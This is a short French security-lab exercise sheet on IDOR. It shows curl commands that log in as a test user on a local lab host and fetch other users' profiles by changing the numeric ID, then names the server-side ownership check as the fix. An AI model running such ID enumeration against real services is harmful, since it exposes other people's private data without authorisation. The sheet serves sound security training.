# J3-C03 — IDOR

## Objectif
Prouver qu’Alice peut lire une ressource appartenant à Bob ou admin.

## Commandes
```bash
curl -i -c cookies.txt -X POST http://authapi.target.local:5001/login \
  -d "username=alice&password=alice123"

curl -b cookies.txt http://authapi.target.local:5001/api/users/1/profile | jq
curl -b cookies.txt http://authapi.target.local:5001/api/users/2/profile | jq
curl -b cookies.txt http://authapi.target.local:5001/api/users/3/profile | jq
```

## WebGoat
Lire/réaliser une leçon Access Control/IDOR.

## Preuve attendue
Alice est authentifiée mais non autorisée à lire les autres profils. Remédiation : contrôle serveur par propriétaire/role.
